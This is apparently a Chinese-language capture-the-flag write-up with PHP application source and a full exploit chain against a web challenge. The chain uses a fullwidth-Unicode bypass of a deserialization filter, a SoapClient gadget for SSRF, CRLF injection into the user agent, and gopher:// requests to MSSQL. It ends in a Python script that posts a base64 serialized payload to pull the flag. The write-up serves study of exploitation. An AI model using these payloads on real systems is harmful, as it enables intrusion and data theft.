    class Attachment {
        private $url = NULL;
        private $za = NULL;
        private $mime = NULL;
        public function __construct($url) {
            $this->url = $url;
            $this->mime = (new finfo)->file("../".$url);
            if (substr($this->mime, 0, 11) == "Zip archive") {
                $this->mime = "Zip archive";
                $this->za = new ZipArchive;
            }
        }
        public function __toString() {
            $str = "url}'>".basename($this->url)." ($this->mime ";
            if (!is_null($this->za)) {
                $this->za->open("../".$this->url);
                $str .= "with ".$this->za->numFiles . " Files.";
            }
            return $str. ")";
        }
    }
    class Post {
        private $title = NULL;
        private $content = NULL;
        private $attachment = NULL;
        private $ref = NULL;
        private $id = NULL;
        public function __construct($title, $content, $attachments="") {
            $this->title = $title;
            $this->content = $content;
            $this->attachment = $attachments;
        }
        public function save() {
            global $USER;
            if (is_null($this->id)) {
                DB::insert("INSERT INTO posts (userid, title, content, attachment) VALUES (?,?,?,?)", 
                    array($USER->uid, $this->title, $this->content, $this->attachment));
            } else {
                DB::query("UPDATE posts SET title = ?, content = ?, attachment = ? WHERE userid = ? AND id = ?",
                    array($this->title, $this->content, $this->attachment, $USER->uid, $this->id));
            }
        }
        public static function truncate() {
            global $USER;
            DB::query("DELETE FROM posts WHERE userid = ?", array($USER->uid));
        }
        public static function load($id) {
            global $USER;
            $res = DB::query("SELECT * FROM posts WHERE userid = ? AND id = ?",
                array($USER->uid, $id));
            if (!$res) die("db error");
            $res = $res[0];
            $post = new Post($res["title"], $res["content"], $res["attachment"]);
            $post->id = $id;
            return $post;
        }
        public static function loadall() {
            global $USER;
            $result = array();
            $posts = DB::query("SELECT id FROM posts WHERE userid = ? ORDER BY id DESC", array($USER->uid)) ;
            if (!$posts) return $result;
            foreach ($posts as $p) {
                $result[] = Post::load($p["id"]);
            }
            return $result;
        }
        public function __toString() {
            $str = "{$this->title}";
            $str .= $this->content;
            $str .= "Attachments:";
            foreach ($this->attachment as $attach) {
                $str .= "$attach";
            }
            $str .= "";
            return $str;
        }
    }
### 任意反序列化
可以发现`DB`类的`query`方法把接收`sql`语句后把执行结果丢给了`retrieve_values`方法，而该方法存在一处反序列化操作，且要求反序列化字符串开头为`$serializedobject$`而`prepare_params`方法waf掉了对开头为`$serializedobject$`的字符串，导致我们无法执行反序列化操作。可是MSSQL的一个trick进行绕过。
**MSSQL会自动将全角unicode字符转换为ASCII表示形式。** 例如，如果字符串包含`0xEF 0xBC
0x84`，则将其存储为`$`。因此我们可以进行任意反序列化。
### 利用SoapClient SSRF
根据hint1，flag在数据库里，源码中含有数据库信息，因此我们可以利用`SoapClient`通过SSRF打MSSQL，前提是要能够触发它的`__call`方法。类`Attachment`的`__tostring`方法中有一个`$this->za->open`操作，我们将`SoapClient`序列化为`$za`，然后触发其`__tostring`方法即可SSRF。而`default.php`中实例化了`Post`类，把`$_POST["title"],
$_POST["content"],
$attachments`传了进去，并调用了`save`方法并将返回的值打印触发`Post`类的`__toString`方法，而返回值含有反序列化对象，因此又可以触发反序列化对象的`__toString`方法，从而可以SSRF。构造exp
    za = new SoapClient(null,array('location'=>'your_ip','uri'=>'your_ip'));   
        }
    }
    $c=new Attachment();
    $aaa=serialize($c);
    echo $aaa;
成功SSRF
### miniProxy绕过
由Nginx配置文件可知，miniProxy代理监听在本地的`8080`端口，且只接收Get请求
    server {
        listen 127.0.0.1:8080;
        access_log /var/log/nginx/proxy.log;
        if ( $request_method !~ ^(GET)$ ) {
            return 405;
        }
        root /var/www/miniProxy;
        location / {
            index index.php;
            location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.2-fpm.sock;
            }
        }
    }
而`SoapClient`发送的是POST请求但是`SoapClientl`的`_user_agent`属性存在CRLF注入，我们可以通过`\r\n`再注入一个GET请求。另外`miniProxy`只能代理`http
/
https`请求可以通过`gopher:///`绕过，因为miniProxy仅在设置`host`时验证`http
/ https`。或者可以重定向到一个`gopher请求`来绕过。
### gopher攻击MSSQL
最后就是构造gopher请求打MSSQL了。因为对MSSQL不熟悉，这里我直接用官方的`exploit.php`。不过要注意gopher会在请求后加上一个`\r\n`，因此构造gopher请求时要在sql语句后加一个注释符`---`通过插入`DEBUG`头我们可以获取到我们的`UID`写脚本上传文件
    import requests
    import base64
    host="http://35.207.83.242/?"
    post={
        "username":"aaaaaaaaaa",
        "password":"aaaaaaaaaa",
    }
    r=requests.Session()
    url1=host+"page=login"
    r.post(url=url1,data=post)
    def fetch_uid():
        return r.get(host, headers={"Debug": "1"}).content.decode().split("int(")[1].split(")")[0]
    payload=base64.b64decode("JHNlcmlhbGl6ZWRvYmplY3TvvIRPOjEwOiJBdHRhY2htZW50IjoxOntzOjI6InphIjtPOjEwOiJTb2FwQ2xpZW50IjozOntzOjM6InVyaSI7czozNToiaHR0cDovL2xvY2FsaG9zdDo4MDgwL21pbmlQcm94eS5waHAiO3M6ODoibG9jYXRpb24iO3M6MzU6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9taW5pUHJveHkucGhwIjtzOjExOiJfdXNlcl9hZ2VudCI7czoxMzk5OiJBQUFBQUhhaGEKCkdFVCAvbWluaVByb3h5LnBocD9nb3BoZXI6Ly8vZGI6MTQzMy9BJTEyJTAxJTAwJTJGJTAwJTAwJTAxJTAwJTAwJTAwJTFBJTAwJTA2JTAxJTAwJTIwJTAwJTAxJTAyJTAwJTIxJTAwJTAxJTAzJTAwJTIyJTAwJTA0JTA0JTAwJTI2JTAwJTAxJUZGJTAwJTAwJTAwJTAxJTAwJTAxJTAyJTAwJTAwJTAwJTAwJTAwJTAwJTEwJTAxJTAwJURFJTAwJTAwJTAxJTAwJUQ2JTAwJTAwJTAwJTA0JTAwJTAwdCUwMCUxMCUwMCUwMCUwMCUwMCUwMCUwMFQwJTAwJTAwJTAwJTAwJTAwJTAwJUUwJTAwJTAwJTA4JUM0JUZGJUZGJUZGJTA5JTA0JTAwJTAwJTVFJTAwJTA3JTAwbCUwMCUwQSUwMCU4MCUwMCUwOCUwMCU5MCUwMCUwQSUwMCVBNCUwMCUwOSUwMCVCNiUwMCUwMCUwMCVCNiUwMCUwNyUwMCVDNCUwMCUwMCUwMCVDNCUwMCUwOSUwMCUwMSUwMiUwMyUwNCUwNSUwNiVENiUwMCUwMCUwMCVENiUwMCUwMCUwMCVENiUwMCUwMCUwMCUwMCUwMCUwMCUwMGElMDB3JTAwZSUwMHMlMDBvJTAwbSUwMGUlMDBjJTAwaCUwMGElMDBsJTAwbCUwMGUlMDBuJTAwZyUwMGUlMDByJTAwJUMxJUE1UyVBNVMlQTUlODMlQTUlQjMlQTUlODIlQTUlQjYlQTUlQjclQTVuJTAwbyUwMGQlMDBlJTAwLSUwMG0lMDBzJTAwcyUwMHElMDBsJTAwbCUwMG8lMDBjJTAwYSUwMGwlMDBoJTAwbyUwMHMlMDB0JTAwVCUwMGUlMDBkJTAwaSUwMG8lMDB1JTAwcyUwMGMlMDBoJTAwYSUwMGwlMDBsJTAwZSUwMG4lMDBnJTAwZSUwMCUwMSUwMSUwMSUwRSUwMCUwMCUwMSUwMCUxNiUwMCUwMCUwMCUxMiUwMCUwMCUwMCUwMiUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMSUwMCUwMCUwMGklMDBuJTAwcyUwMGUlMDByJTAwdCUwMCUyMCUwMGklMDBuJTAwdCUwMG8lMDAlMjAlMDBwJTAwbyUwMHMlMDB0JTAwcyUwMCUyMCUwMCUyOCUwMHUlMDBzJTAwZSUwMHIlMDBpJTAwZCUwMCUyQyUwMCUyMCUwMHQlMDBpJTAwdCUwMGwlMDBlJTAwJTJDJTAwJTIwJTAwYyUwMG8lMDBuJTAwdCUwMGUlMDBuJTAwdCUwMCUyQyUwMCUyMCUwMGElMDB0JTAwdCUwMGElMDBjJTAwaCUwMG0lMDBlJTAwbiUwMHQlMDAlMjklMDAlMjAlMDB2JTAwYSUwMGwlMDB1JTAwZSUwMHMlMDAlMjAlMDAlMjglMDAyJTAwMCUwMDAlMDAlMkMlMDAlMjAlMDAlMjIlMDB0JTAwZSUwMHMlMDB0JTAwJTIyJTAwJTJDJTAwJTIwJTAwJTI4JTAwcyUwMGUlMDBsJTAwZSUwMGMlMDB0JTAwJTIwJTAwZiUwMGwlMDBhJTAwZyUwMCUyMCUwMGYlMDByJTAwbyUwMG0lMDAlMjAlMDBmJTAwbCUwMGElMDBnJTAwLiUwMGYlMDBsJTAwYSUwMGclMDAlMjklMDAlMkMlMDAlMjAlMDAlMjIlMDB0JTAwZSUwMHMlMDB0JTAwJTIyJTAwJTI5JTAwJTNCJTAwJTNCJTAwLSUwMC0lMDAlMjAlMDAtJTAwIEhUVFAvMS4xCkhvc3Q6IGxvY2FsaG9zdAoKIjt9fQ==")
    print(payload)
    data={
        "title":"testssssssssssssss",
        "content":payload,
    }
    url2=host+"action=create"
    r.post(url=url2,data=data)
刷新得到flag